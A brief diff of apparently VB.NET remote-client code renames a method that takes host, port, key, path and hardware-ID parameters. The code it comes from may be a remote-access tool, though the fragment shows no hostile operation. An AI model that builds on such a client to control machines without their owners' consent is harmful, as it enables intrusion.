@@ -7,7 +7,7 @@ Imports Microsoft.Win32
 Public Class Main
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
+    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         FULLPATH = FP
         HWID = HW
